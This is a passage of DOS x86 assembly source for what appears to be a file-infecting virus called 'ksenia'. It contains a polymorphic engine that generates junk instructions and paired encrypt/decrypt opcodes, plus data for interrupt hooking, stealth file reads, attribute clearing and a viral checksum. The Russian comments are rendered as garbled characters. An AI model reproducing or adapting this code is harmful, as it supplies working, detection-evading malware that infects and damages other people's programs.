           lea     di,[buffer+(signature-ksenia)]
           mov     cx,ssize
           rep     movsb
           mov     ax,cr_ptr
           mov     w [buffer+(nex_ptr-ksenia)],ax

           call    LoadRegs
           mov     cx,vsize
           lea     dx,buffer
           ret

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ¯®¤¯à®£à ¬¬  ¤«ï £¥¥à æ¨¨ ¬ãá®à®£® ª®¤    ¡ §¥ â ¡«¨æë
   ; ¢ ª ç¥áâ¢¥ ¢å®¤ëå ¯ à ¬¥âà®¢ ãáâ ®¢¨âì ES:DI   ¡ãä¥à ¤«ï à¥§ã«ìâ â 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    maxg   equ     crlen/7         ; maximum number of garbage bytes
    fixedfill:                     ; fixed number of garbage bytes (AX)
           call    SaveRegs
           jmp     fill
    garbage:
           call    SaveRegs
           mov     ax,maxg         ; getting random number of garbage
           call    get_rnd         ; instructions
    fill:  mov     cx,ax           ; exit on CX=0
           or      cx,cx
           jz      garb_ret

    gloop: push    cx di
           lea     si,opcz         ; SI -> our table with opcodes and offsets
           mov     ax,total        ; get random number of instruction
           call    get_rnd
           imul    ax,op2n-opcz    ; get relative offset ()
           add     si,ax
           mov     dx,[si]         ; read instruction opcode
           xchg    dl,dh

           mov     wflag,0         ; no W field means
           cmp     B [si+2],0ffh   ; check if W field required
           jz      no_W

           mov     ax,2            ; get 0 or 1 (B/W)
           call    get_rnd
           mov     wflag,ax        ; set value to number of required random
           inc     wflag           ; bytes after instruction
           mov     cl,B [si+2]     ; read W-bit number
           shl     ax,cl           ; set it up
           or      dx,ax           ; update opcode

    no_W:  cmp     B [si+3],0ffh   ; check if REG field required
           jz      no_R
           call    get_reg         ; get random register number (REG)
           mov     cl,B [si+3]     ; read REG bit number
           shl     ax,cl
           or      dx,ax           ; update opcode

    no_R:  xchg    ax,dx           ; store instruction
           xchg    al,ah           ; if instruction the same with the previous

           cmp     al,0feh
           jae     no_store
           stosb
           cmp     si,offset onebyte
           jae     imm8
           xchg    al,ah
           stosb

    imm8:  mov     cx,wflag       ; get number of random
           jcxz    no_store       ; bytes after instruction
    rndb:  mov     ax,100h
           call    get_rnd
           stosb
           loop    rndb
    no_store:
           pop     ax cx
           sub     ax,di
           neg     ax              ; number of bytes of the instruction
           sub     cx,ax
           ja      gloop
           jz      garb_ret
           add     cx,ax
           sub     di,ax
           jmp     gloop

    garb_ret:
           mov     wflag,di
           call    LoadRegs
           mov     di,wflag
           ret

   ; gets random REG field into al without [r_used ]
    get_reg:
           mov     ax,8            ; get random value
           call    get_rnd
           mov     ah,al

           cmp     wflag,1         ; check REG
           jnz     r16
           and     ah,11111011b    ; 8-bit regs
           jmp     allbits

    r16:   cmp     ah,100b         ; check for SP REG
           jz      get_reg
    allbits:
           cmp     r_used,ah       ; 16-bit regs
           jz      get_reg
           cmp     r_used+1,ah
           jz      get_reg
           cbw
           ret

   ; encryptors    FEDCBA98  76543210
   ; dectyptors    ||||||||  ||||||||
    crins  label   byte
           db      10000000b,00110000b       ; XOR
           db      10000000b,00110000b       ; XOR

    cp2n   db      10000000b,00000000b       ; ADD
           db      10000000b,00101000b       ; SUB

           db      10000000b,00101000b       ; SUB
           db      10000000b,00000000b       ; ADD

           db      11000000b,00001000b       ; ROR
           db      11000000b,00000000b       ; ROL

           db      11000000b,00000000b       ; ROL
           db      11000000b,00001000b       ; ROR

           db      11110110b,00010000b       ; NOT
           db      11110110b,00010000b       ; NOT

           db      11110110b,00011000b       ; NEG
           db      11110110b,00011000b       ; NEG

           db      11111110b,00000000b       ; INC
           db      11111110b,00001000b       ; DEC

           db      11111110b,00001000b       ; DEC
           db      11111110b,00000000b       ; INC
    ctotal equ     ($-crins)/(cp2n-crins)

   ; opcodes       FEDCBA98  76543210
   ; table         ||||||||  ||||||||
    opcz   db      11000110b,11000000b       ; opcode   (MOVL)
           db      8                         ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
    op2n   db      10000000b,11000000b       ; opcode   (ADD)
           db      8                         ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
           db      10000000b,11101000b       ; opcode   (SUB)
           db      8                         ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
           db      10000000b,11111000b       ; opcode   (CMP)
           db      8                         ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
           db      11110111b,11011000b       ; opcode   (NEG16)
           db      0ffh                      ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
           db      11110111b,11010000b       ; opcode   (NOT16)
           db      0ffh                      ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
           db      10000000b,11100000b       ; opcode   (AND)
           db      8                         ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
           db      11110110b,11000000b       ; opcode   (TEST)
           db      8                         ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
           db      10000000b,11001000b       ; opcode   (OR)
           db      8                         ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
           db      10000000b,11110000b       ; opcode   (XOR)
           db      8                         ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
           db      10000000b,11011000b       ; opcode   (SBB)
           db      8                         ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
           db      10000000b,11010000b       ; opcode   (ADC)
           db      8                         ; W field ptr (FF if none)
           db      02h-2                     ; "reg" bit ptr (FF if none)
           db      11001101b,00000001b       ; opcode   (INT 01)
           db      0ffh                      ; W field ptr (FF if none)
           db      0ffh                      ; "reg" bit ptr (FF if none)
           db      11001101b,00000011b       ; opcode   (INT 03)
           db      0ffh                      ; W field ptr (FF if none)
           db      0ffh                      ; "reg" bit ptr (FF if none)
           db      01110000b,0               ; opcode   (Jxx $+2)
           db      0ffh                      ; W field ptr (FF if none)
           db      0ah-2                     ; "reg" bit ptr (FF if none)
           db      01111000b,0               ; opcode   (Jxx $+2)
           db      0ffh                      ; W field ptr (FF if none)
           db      0ah-2                     ; "reg" bit ptr (FF if none)
           db      11100011b,0               ; opcode   (Jcxz $+2)
           db      0ffh                      ; W field ptr (FF if none)
           db      0ffh                      ; "reg" bit ptr (FF if none)
           db      11101011b,0               ; opcode   (Jmp short $+2)
           db      0ffh                      ; W field ptr (FF if none)
           db      0ffh                      ; "reg" bit ptr (FF if none)
    onebyte:       ; - One-byte instructions
           db      10110000b,0               ; opcode   (MOV)
           db      0bh                       ; W field ptr (FF if none)
           db      0ah-2                     ; "reg" bit ptr (FF if none)
           db      01000000b,0               ; opcode   (INC)
           db      0ffh                      ; W field ptr (FF if none)
           db      0Ah-2                     ; "reg" bit ptr (FF if none)
           db      01001000b,0               ; opcode   (DEC)
           db      0ffh                      ; W field ptr (FF if none)
           db      0Ah-2                     ; "reg" bit ptr (FF if none)
           db      11001100b,0               ; opcode   (int3)
           db      0ffh                      ; W field ptr (FF if none)
           db      0ffh                      ; "reg" bit ptr (FF if none)
           db      11111000b,0               ; opcode   (S/Cf)
           db      0ffh                      ; W field ptr (FF if none)
           db      0ah-2                     ; "reg" bit ptr (FF if none)
    total  equ     ($-opcz)/(op2n-opcz)

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ª®¥æ ¯®¤áç¥â  CRC
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    end_crc:

    random1                dw      0         ; ¯ à  á«ãç ©ëå ç¨á¥«
    random2                dw      0
    checksum               dd      0f90738adh; CRC32 ¢¨àãá 

    epb                    dw      0         ; Execute Parameter Block
                           dw      80h       ; ª®¬ ¤ ï áâà®ª 
    seg0                   dw      0
                           dw      5ch       ; FCB#1
    seg1                   dw      0
                           dw      6ch       ; FCB#2
    seg2                   dw      0
    original               db      0c3h,31 dup (0)

    nex_ptr                dw      0         ; ãª § â¥«ì   à áè¨äà®¢é¨ª
    signature              db      ssize dup (0)

   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ; ®¡« áâì ¥¤¨áª®¢ëå ¤ ëå - ª®¥æ ä ©«®¢®© ç áâ¨ ¢¨àãá 
   ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
    eov:

    io08                   dw      ?,?       ; ïç¥©ª¨ åà ¥¨ï ¢¥ªâ®à®¢
    io21p                  dw      ?,?       ; ¯à¥àë¢ ¨©
    io24                   dw      ?,?
    stf                   db      ?         ; à¥¦¨¬ áâ¥«á (mcbcheck)
    command                db      ?         ; command.com (mcbcheck)
    seek_pos               dw      ?,?       ; ¯®§¨æ¨ï ãª § â¥«ï (SeekSave)
    nrbytes                dw      ?         ; ¯à®ç¨â ë¥ ¡ ©âë (ReadStealth)
    rm_field               db      ?         ; åà ¥¨¥ R/M ¯®«ï ¨¤¥ªá  (NEXUS)
    r_used                 db      ?,?       ; 2 ¨á¯®«ì§ã¥¬ëå à¥£¨áâà  (NEXUS)
    offs_ptr               dw      ?         ; (NEXUS)
    cr_ptr                 dw      ?         ; (NEXUS)
    wflag                  dw      ?         ; ä« £ W ®¯ª®¤  (NEXUS)
    do_enc                 db      ?,?,?,?   ; ®¯ª®¤-¡ãä¥à (NEXUS/CRLOAD)
    fn_ptr                 dw      ?,?       ; ¨¬ï ä ©«  (ClrAttrib)
    attrib                 dw      ?         ;  ââà¨¡ãâë (ClrAttrib)
    time                   dw      ?         ; ¢à¥¬ï ä ©«  (GetDate)
    date                   dw      ?         ; ¤ â  ä ©«  (GetDate)
    delta                  dw      ?         ; +á¬¥é¥¨¥ (¢å®¤®© ¯ à ¬¥âà NEXUS)
    w95state               dw      ?         ; á®áâ®ï¨¥ Win95 (â®ç¥¥ WinOldAp)
    save_ax                dw      ?         ; ¯¥à¥¤ ç  ¯ à ¬¥âà®¢ ¬¥¥¤¦¥à 
    save_bx                dw      ?         ; à¥§¨¤¥â®© ç áâ¨ ®¡à ¡®âç¨ª ¬
    save_es                dw      ?         ;
    delay                  db      ?         ; áç¥âç¨ª ¤«ï Virus Guard

    header                 db      32 dup (?)
    buffer                 db      vsize dup (?)
    stacks                 db      100h dup (?)

    eom:                   end     ksenia
